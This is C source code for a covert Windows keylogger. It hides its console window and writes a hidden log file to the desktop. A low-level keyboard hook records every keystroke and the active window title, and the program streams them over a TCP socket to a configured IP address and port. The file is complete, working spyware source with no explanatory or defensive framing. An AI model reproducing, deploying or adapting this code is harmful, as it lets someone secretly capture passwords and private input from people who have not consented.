//gcc .\win.c -o run -lwsock32
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>

#define IP "127.0.0.1"
#define PORT 6969

#define WINAPI __stdcall

char ACTIVEWINDOW[256]="Active\x00";
char PREVWINDOW[256]="Prev\x00";
char fname[20] = "data.log\x00";

char msg[256] = "";

SOCKET sockfd;
FILE *fp;

int HiddenFile(){
    char path[100];
    SHGetSpecialFolderPathA(HWND_DESKTOP, path , CSIDL_DESKTOP, FALSE);
    SetCurrentDirectory(path);
    fp = fopen(fname,"a");

    if(fp == NULL)
        exit(1);

    int attr = GetFileAttributes(fname);
    SetFileAttributes(fname,attr | FILE_ATTRIBUTE_HIDDEN);
    return 0;
}

int ActiveWindow(){
    memset(msg,'\x00',256);
    HWND win = GetForegroundWindow();
    if(win){
        GetWindowText(win,ACTIVEWINDOW,200);
    }
    if(strcmp(PREVWINDOW,ACTIVEWINDOW)){
        fprintf(fp,"%s \n",ACTIVEWINDOW);
        strcpy(msg,ACTIVEWINDOW);
        send(sockfd, msg , strlen(msg),0);
    }
    strcpy(PREVWINDOW,ACTIVEWINDOW);
    
    return 0;
}

LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam){

    memset(msg,'\x00',256);    

    ActiveWindow();
    PKBDLLHOOKSTRUCT hookStruct = (PKBDLLHOOKSTRUCT)lParam;

    if(WM_KEYDOWN == wParam || WM_SYSKEYDOWN == wParam){
        int keycode = hookStruct->vkCode;

        if(keycode >= 0x41 && keycode <= 0x5A){
            if((GetKeyState(VK_CAPITAL) & 0x001 )!=0){
                //fprintf(fp,"%c" ,keycode);
                msg[0] = keycode;                
            }
            else{
                //fprintf(fp,"%c",(keycode+0x20));
                msg[0]=keycode+0x20;
            }
        }
        
        if(keycode >= 0x30 && keycode <= 0x39){
            //fprintf(fp,"%c",(keycode));
            msg[0] = keycode;
        }
            
        
        if(keycode >= 0x60 && keycode <= 0x69){
            //fprintf(fp,"%c",(keycode-0x30));
            msg[0] = keycode-0x30;
        }

        switch(keycode){
            case 0x08:
                //fprintf(fp,"\nBKSPC");
                strcpy(msg,"BKSPC\n");  
                break;
            case 0x09:
                //fprintf(fp,"\nTAB");
                strcpy(msg,"TAB\n");
                break;
            case 0x0D:
                //fprintf(fp,"\nENTER");
                strcpy(msg,"ENTER\n");
                break;
            case 0xA0:
                //fprintf(fp,"SHIFT");
                strcpy(msg,"LSHIFT\n");
                break;
            case 0xA1:
                //fprintf(fp,"RSHIFT");
                strcpy(msg,"RSHIFT\n");
                break;
            case 0xA3:
                //fprintf(fp,"RCONTROL");
                strcpy(msg,"RCTRL\n");
                break;
            case 0xA2:
                //fprintf(fp,"LCONTROL");
                strcpy(msg,"LCTRL\n");
                break;
            case 0x12:
                //fprintf(fp,"ALT");
                strcpy(msg,"ALT\n");
                break;
            case 0x20:
                //fprintf(fp," ");
                strcpy(msg," ");
                break;
        }
        send(sockfd, msg , strlen(msg),0);
    }
    return CallNextHookEx(NULL,code, wParam, lParam);
}

int createSocketandSend(){
    WSADATA wsa;
    struct sockaddr_in server;

    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        printf("Failed ; Error : %d", WSAGetLastError());
        return 1;
    }

    puts("Initialized Winsock");

    sockfd = socket(AF_INET, SOCK_STREAM,0);
    if(sockfd < 0){
        printf("Failed to create socket : %d", WSAGetLastError());
        return 1;
    }

    puts("Socket Created");
    
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    int conn = connect(sockfd,(struct sockaddr *)&server, sizeof(server));
    if(conn < 0){
        puts("Conn error");
        printf("%d",WSAGetLastError());
        return -1;
    }
    puts("Connected");

    return 0 ;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    
    HWND windowHandle = GetConsoleWindow();
    ShowWindow(windowHandle, SW_HIDE);

    HiddenFile();
    
    printf("IP -> %s\nPort -> %d\n",IP,PORT);
    
    createSocketandSend();
    HHOOK kHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0); 
    MSG msg ;
    while(GetMessage(&msg,NULL,0,0) >0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);

    }
    UnhookWindowsHookEx(kHook);

    return 0;
}   